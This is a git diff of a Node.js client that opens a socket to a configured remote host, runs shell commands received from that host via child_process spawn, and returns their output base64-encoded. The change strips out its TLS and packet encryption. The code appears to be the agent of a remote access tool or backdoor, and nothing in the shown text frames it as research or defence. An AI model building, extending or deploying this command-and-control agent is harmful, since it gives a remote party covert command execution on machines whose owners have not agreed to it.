@@ -1,4 +1,4 @@
-var tls = require('tls');
+var net = require('net');
 var crypto = require('./utils/crypto');
 var delay = require('./utils/delay');
 var config = require('./config.json');
@@ -6,7 +6,6 @@ var parser = require('./utils/parser');
 var logger = require('./utils/logger');
 var Packet = require('./models/packet')
 var spawn = require('child_process').spawn;
-var StringDecoder = require('string_decoder').StringDecoder;
 
 var sender_id;
 var receiver_id;
@@ -14,27 +13,29 @@ var baseSocket;
 var socketOpen = false;
 
 function openSocket() {
-    if (!socketOpen) {
-        baseSocket = tls.connect({
-            port: config.port,
-            host: config.host
-        });
-        baseSocket.setKeepAlive(true);
-        baseSocket.setEncoding(config.default_encoding);
-        baseSocket.on('connect', onConnect.bind({}, baseSocket));
-        baseSocket.on('error', destroySocket.bind({}, baseSocket));
-        baseSocket.on('data', onData.bind({}, baseSocket));
-        baseSocket.on('close', destroySocket.bind({}, baseSocket));
-        socketOpen = true;
+    try {
+        if (!socketOpen) {
+            baseSocket = net.connect({
+                port: config.port,
+                host: config.host
+            });
+            baseSocket.setKeepAlive(true);
+            baseSocket.setEncoding(config.default_encoding);
+            baseSocket.on('connect', onConnect.bind({}, baseSocket));
+            baseSocket.on('error', destroySocket.bind({}, baseSocket));
+            baseSocket.on('data', onData.bind({}, baseSocket));
+            baseSocket.on('close', destroySocket.bind({}, baseSocket));
+            socketOpen = true;
+        }
+    } catch (err) {
+        console.log(`error: ${err}`);
     }
-
 }
 var onConnect = function() {
     console.log('-> SERVER : Succesfully connected');
 };
 
-var onData = function(socket, cipher) {
-    var data = crypto.decrypt(cipher);
+var onData = function(socket, data) {
     if (!parser.isValid(data)) {
         return;
     }
@@ -47,8 +48,7 @@ var send = function(data) {
     let parsedPacket = parser.encode(data);
     console.log(`raw Packet: ${data}`);
     console.log(`parsed Packet: ${parsedPacket}`);
-    let encryptedPacket = crypto.encrypt(parsedPacket);
-    baseSocket.write(encryptedPacket);
+    baseSocket.write(parsedPacket);
 };
 var destroySocket = function() {
     // Kill socket
@@ -73,7 +73,6 @@ var processPacket = function(packet) {
 
 var childObject;
 var processCommand = function(cmd, cmdData) {
-    var decoder = new StringDecoder('utf8');
     if (cmd === 'cmd') {
         var output;
 
@@ -95,23 +94,18 @@ var processCommand = function(cmd, cmdData) {
             console.log('stdout: ' + data);
             output = data;
             var toSend = new Packet(sender_id, receiver_id, {
-                output: decoder.write(data)
+                output: new Buffer(output).toString('base64')
             });
             send(toSend);
         });
     } else if (cmd === "sig") {
-        try {
-            childObject.kill();
-        } catch (err) {
-            console.log(err);
-        }
+        childObject.kill();
     } else if (cmd === "ack") {
         var toSend = new Packet(sender_id, receiver_id, {
-            name: decoder.write("TOM")
+            name: "TOM"
         });
         send(toSend);
     }
 };
-
 
 openSocket();
